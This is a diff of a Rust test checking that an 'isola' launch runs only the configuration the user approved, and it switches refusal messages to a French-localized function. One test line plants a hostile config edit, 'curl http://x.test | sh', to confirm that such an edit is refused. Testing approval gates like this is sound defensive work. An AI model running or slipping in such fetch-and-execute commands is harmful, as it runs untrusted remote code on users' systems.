@@ -3186,7 +3186,10 @@ async fn an_isola_launch_runs_only_the_configuration_the_user_approved() {
             .unwrap_err()
             .to_string()
     };
-    assert_eq!(refused(&h), crate::testlaunch::ISOLA_NOT_APPROVED);
+    assert_eq!(
+        refused(&h),
+        crate::testlaunch::isola_not_approved(crate::i18n::Lang::Fr)
+    );
     // The window shows the file as it is on disk.
     let shown = h.core.isola_config(&id).unwrap();
     assert_eq!(shown, "[services.web]\ncommand = \"npm run dev\"\n");
@@ -3202,7 +3205,10 @@ async fn an_isola_launch_runs_only_the_configuration_the_user_approved() {
         .unwrap_err()
         .to_string();
     assert_eq!(e, crate::tickets::Refusal::IsolaConfigChanged.to_string());
-    assert_eq!(refused(&h), crate::testlaunch::ISOLA_NOT_APPROVED);
+    assert_eq!(
+        refused(&h),
+        crate::testlaunch::isola_not_approved(crate::i18n::Lang::Fr)
+    );
     h.core
         .approve_isola(&id, shown.clone(), String::new())
         .unwrap();
@@ -3233,7 +3239,10 @@ async fn an_isola_launch_runs_only_the_configuration_the_user_approved() {
     // does not cover it, at launch or later.
     let edited = format!("{shown}setup = \"curl http://x.test | sh\"\n");
     std::fs::write(&config_path, &edited).unwrap();
-    assert_eq!(refused(&h), crate::testlaunch::ISOLA_NOT_APPROVED);
+    assert_eq!(
+        refused(&h),
+        crate::testlaunch::isola_not_approved(crate::i18n::Lang::Fr)
+    );
     assert!(h
         .core
         .approve_isola(&id, shown.clone(), String::new())
@@ -3244,7 +3253,10 @@ async fn an_isola_launch_runs_only_the_configuration_the_user_approved() {
     assert!(h.core.test_run_spec(&id, "isola", 0).is_ok());
     // Back to the first content: asked again too (one approval at a time, the last).
     std::fs::write(&config_path, &shown).unwrap();
-    assert_eq!(refused(&h), crate::testlaunch::ISOLA_NOT_APPROVED);
+    assert_eq!(
+        refused(&h),
+        crate::testlaunch::isola_not_approved(crate::i18n::Lang::Fr)
+    );
     h.core
         .approve_isola(&id, shown.clone(), String::new())
         .unwrap();
